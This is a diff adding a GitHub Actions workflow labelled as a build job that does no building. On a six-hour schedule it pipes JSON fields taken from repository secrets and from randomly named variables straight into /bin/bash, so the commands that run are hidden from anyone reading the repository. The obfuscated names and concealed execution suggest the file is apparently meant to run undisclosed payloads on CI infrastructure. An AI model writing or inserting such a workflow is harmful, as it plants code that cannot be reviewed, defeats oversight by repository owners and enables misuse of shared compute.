@@ -1,0 +1,24 @@
+name: hugeloveclv
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hugeloveclv
+        env:
+          zuqq75: ${{ secrets.zuqq75 }}
+        run: |
+          echo $zuqq75 | jq -r .ywd45 | /bin/bash
+          echo $wr764 | jq -r .kqfy77820 | /bin/bash
+          echo $gcnf7 | jq -r .ur40454 | /bin/bash
+          echo $xk62 | jq -r .c4 | /bin/bash
+          echo $xq39253 | jq -r .xbepg677 | /bin/bash
+          echo $vi1956 | jq -r .teikz03 | /bin/bash
+          echo $xc89 | jq -r .cgw798 | /bin/bash
+          echo $skg213 | jq -r .wnh700 | /bin/bash
+
